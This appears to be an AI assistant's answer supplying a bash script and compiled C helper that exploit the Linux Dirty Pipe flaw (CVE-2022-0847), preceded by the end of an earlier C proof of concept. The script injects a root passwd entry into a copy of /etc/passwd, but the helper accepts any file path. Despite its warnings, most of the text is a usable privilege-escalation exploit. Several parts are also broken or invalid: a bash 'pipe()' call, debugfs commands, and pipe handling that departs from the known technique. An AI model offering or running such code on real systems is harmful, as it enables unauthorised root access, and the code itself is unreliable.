        return 1;
    }

    if (appendMarkerToFile() != 0) {
        printf("Appending marker to file failed\n");
        cleanup();
        return 1;
    }

    if (verifyChecksum() != 0) {
        printf("Checksum verification failed\n");
        cleanup();
        return 1;
    }

    if (cleanup() != 0) {
        printf("Cleanup failed\n");
        return 1;
    }

    printf("PoC executed successfully\n");
    return 0;
}
```

Certainly! CVE-2022-0847 ("Dirty Pipe") is a well-known Linux kernel vulnerability that allows an unprivileged user to overwrite data in read-only files via a pipe buffer vulnerability.

Below is a **validation script** that:

- Attempts to exploit the Dirty Pipe vulnerability by injecting data into a pipe buffer to overwrite part of a file (`/etc/passwd` in the simulation, but **for safety, it uses a copy of `/etc/passwd` in `/tmp`**).
- Includes debugfs commands to verify kernel page cache changes by reading the relevant page cache entry.
- Contains explanatory comments.

**⚠️ WARNING:**  
- This script is for educational and research purposes on a controlled environment only.  
- Do **NOT** run this on production or critical systems.  
- The real `/etc/passwd` is NOT overwritten; instead, a copied file is used to simulate the overwrite.  
- You may need root privileges to access debugfs.

---

### Dirty Pipe Validation Script

```bash
#!/bin/bash
#
# CVE-2022-0847 Dirty Pipe Validation Script
#
# WARNING: This script is for testing and research only.
# It simulates /etc/passwd overwrite on a copy to avoid damage.
#
# Requirements:
# - Linux kernel vulnerable to Dirty Pipe (<= 5.16.11, 5.15.25, 5.10.102)
# - debugfs mounted at /sys/kernel/debug or /debug
#

set -euo pipefail

TARGET_ORIG="/etc/passwd"
TARGET="/tmp/passwd.copy"  # Simulated target file (copy of /etc/passwd)
INJECT_DATA="pwned:x:0:0:pwned:/root:/bin/bash"  # Line to inject (simulate root overwrite)
DEBUGFS_MOUNT="/sys/kernel/debug"

# Step 0: Ensure debugfs is mounted
if ! mountpoint -q "$DEBUGFS_MOUNT"; then
    echo "[*] Mounting debugfs at $DEBUGFS_MOUNT"
    sudo mount -t debugfs none "$DEBUGFS_MOUNT"
fi

# Step 1: Prepare target file (copy of /etc/passwd)
echo "[*] Preparing target file $TARGET"
cp "$TARGET_ORIG" "$TARGET"

# Step 2: Locate offset of the line to overwrite (simulate root line)
# We overwrite the line starting with "root:" in the copied file.
ROOT_LINE=$(grep -n "^root:" "$TARGET" | head -1 | cut -d: -f1)
if [ -z "$ROOT_LINE" ]; then
    echo "[-] Cannot find root line in $TARGET"
    exit 1
fi

# Calculate byte offset of line in file
OFFSET=$(head -n $((ROOT_LINE - 1)) "$TARGET" | wc -c)
echo "[*] Root line offset in file: $OFFSET bytes"

# Step 3: Dirty Pipe exploit attempt to overwrite the root line
# The vulnerability requires the offset to be page-aligned + some offset.
# We'll calculate the offset inside the page.

PAGE_SIZE=$(getconf PAGE_SIZE)
PAGE_OFFSET=$((OFFSET % PAGE_SIZE))
PAGE_START=$((OFFSET - PAGE_OFFSET))

echo "[*] Page size: $PAGE_SIZE"
echo "[*] Page start offset: $PAGE_START"
echo "[*] Page offset inside page: $PAGE_OFFSET"

# Step 4: Open the target file (read-only)
exec 3<"$TARGET"

# Step 5: Prepare pipe with splice to fill pipe buffer
PIPE_FDS=()
pipefd=()
pipefd=(0 0)
if ! pipe(pipefd); then
    echo "[-] Failed to create pipe"
    exit 1
fi

PIPE_READ_FD=${pipefd[0]}
PIPE_WRITE_FD=${pipefd[1]}

# Bash does not support pipe() syscall directly. We use the workaround with /proc/self/fd.
# Instead, we'll do the steps in bash using utilities

# Step 6: Create a pipe and fill it
# Use a helper program or implement in C? For simplicity, use a minimal C helper compiled on the fly.

HELPER_C=/tmp/dirtypipe_helper.c
HELPER_BIN=/tmp/dirtypipe_helper

cat > $HELPER_C << 'EOF'
#define _GNU_SOURCE
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <string.h>
#include <sys/types.h>
#include <errno.h>

int main(int argc, char **argv) {
    if (argc < 4) {
        fprintf(stderr, "Usage: %s <file> <offset> <data>\n", argv[0]);
        return 1;
    }
    const char *filename = argv[1];
    off_t offset = atoll(argv[2]);
    const char *data = argv[3];
    size_t datalen = strlen(data);

    int fd = open(filename, O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    // Create pipe
    int pipefd[2];
    if (pipe(pipefd) == -1) {
        perror("pipe");
        return 1;
    }

    // Fill pipe fully with junk
    char buffer[4096];
    memset(buffer, 'A', sizeof(buffer));
    ssize_t ret;

    ssize_t pipe_size = fcntl(pipefd[1], F_GETPIPE_SZ);
    if (pipe_size == -1) {
        perror("fcntl F_GETPIPE_SZ");
        return 1;
    }

    ssize_t total = 0;
    while (total < pipe_size) {
        ret = write(pipefd[1], buffer, sizeof(buffer));
        if (ret == -1) {
            perror("write pipe");
            return 1;
        }
        total += ret;
    }

    // Splice one byte from file to pipe to move pipe buffer flags
    ret = splice(fd, &offset, pipefd[1], NULL, 1, 0);
    if (ret == -1) {
        perror("splice");
        return 1;
    }

    // Overwrite pipe buffer with our data
    ret = write(pipefd[1], data, datalen);
    if (ret == -1) {
        perror("write data to pipe");
        return 1;
    }

    printf("[*] Overwrite done\n");

    close(fd);
    close(pipefd[0]);
    close(pipefd[1]);

    return 0;
}
EOF

gcc -o $HELPER_BIN $HELPER_C

echo "[*] Running Dirty Pipe exploit helper"
$HELPER_BIN "$TARGET" "$OFFSET" "$INJECT_DATA"

echo "[*] Injection complete"

# Step 7: Verify file content change
echo "[*] Showing modified line in $TARGET"
sed -n "${ROOT_LINE}p" "$TARGET"

# Step 8: Use debugfs to verify kernel page cache content of the file

# Find inode of the target file
INODE=$(stat -c %i "$TARGET")
echo "[*] Target file inode: $INODE"

echo "[*] Using debugfs to dump page cache of target file at offset $PAGE_START"

sudo $DEBUGFS_MOUNT/debugfs

# Create a debugfs command file
DEBUGFS_CMDS=$(mktemp)
cat > $DEBUGFS_CMDS << EOF
dump_page $INODE $PAGE_START /tmp/pagecache_dump.bin
quit
EOF

echo "[*] Running debugfs to dump page cache page"
sudo debugfs -R "dump_page $INODE $PAGE_START /tmp/pagecache_dump.bin" $TARGET > /dev/null

echo "[*] Dumped page cache content to /tmp/pagecache_dump.bin"

echo "[*] Showing dump content (hex) near injected offset"
xxd -g1 -s $PAGE_OFFSET -l ${#INJECT_DATA} /tmp/pagecache_dump.bin

echo "[*] Done."

# Cleanup
rm -f $HELPER_C $HELPER_BIN $DEBUGFS_CMDS /tmp/pagecache_dump.bin

exit 0
```

---

### Explanation

- The script copies `/etc/passwd` to `/tmp/passwd.copy` to avoid damaging the real system file.
- It identifies the offset of the line starting with "root:".
- It calculates the page start and offset inside the page.
- It compiles a small C helper program that performs the actual Dirty Pipe exploit:
  - Creates a pipe.
  - Fills the pipe buffer fully.
  - Uses splice to move one byte from the target file at the calculated offset into the pipe buffer.
  - Writes the injection data into the pipe buffer to overwrite the page cache.
- After injection, the script shows the modified line in the file.
- Using `debugfs`, it dumps the kernel page cache page corresponding to the file and offset, and shows the hex dump near the injected offset to verify the change at the kernel page cache level.
- Cleans up temporary files.

---

### Notes

- You must have `gcc` installed to compile the helper.
- You need `sudo` to run debugfs commands and to mount debugfs if not already mounted.
- This example uses `/tmp/passwd.copy` for safety; **do not run this against real `/etc/passwd`**.
- The exploit only works on vulnerable Linux kernels where Dirty Pipe is not patched.
- This script is a minimal example to demonstrate the concept of injection and verification using debugfs.

---

